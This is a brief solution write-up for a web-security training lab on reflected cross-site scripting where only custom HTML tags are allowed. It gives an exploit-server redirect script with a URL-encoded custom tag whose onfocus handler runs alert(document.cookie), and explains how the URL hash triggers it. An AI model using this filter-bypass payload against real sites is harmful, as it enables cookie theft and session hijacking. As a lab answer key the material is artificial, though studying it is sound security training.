# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

Open the exploit server and save the following code as the exploit:
```
<script>
location = 'https://lab-subdomain.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

Deliver the link to the victim to solve the lab.

---

This creates a custom tag with the ID x, containing an onfocus event. The event is triggered by the hash at the end of the url, which focuses on the element when the page is loaded. This causes the alert function to be executed.